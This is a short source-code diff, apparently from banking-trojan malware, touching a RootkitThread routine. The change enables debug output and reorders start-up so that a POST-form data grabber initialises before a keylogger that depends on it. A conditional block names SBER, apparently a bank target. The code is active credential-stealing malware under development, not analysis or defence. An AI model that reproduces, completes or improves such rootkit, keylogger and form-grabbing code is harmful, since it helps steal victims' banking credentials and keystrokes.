@@ -22,7 +22,7 @@
 
 //---------------------------------------------------------------------------
 
-//#include "BotDebug.h"
+#include "BotDebug.h"
 
 namespace ROOTKITDEBUGSTRINGS
 {
@@ -430,13 +430,15 @@ DWORD WINAPI RootkitThread( LPVOID lpData, LPVOID, LPVOID )
 
     RTKDBG("rotkit", "«апущен процесс %s", AppName);
 
-	#ifdef KeyLogSystemsH
-		StartKeyLogger(AppName);
-	#endif
-
+	//!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
 	//инициализируем систему оповещени€ о пост данных, должен быть запущен раньше кейлогера
+	//т. к. в кейлогере есть системы которым нужен инициализированный модуль PostDataGrabber
 	#ifdef PostDataGrabberH
 		PostDataGrabber::Init();
+	#endif
+
+	#ifdef KeyLogSystemsH
+		StartKeyLogger(AppName);
 	#endif
 
 	#ifdef SBERH
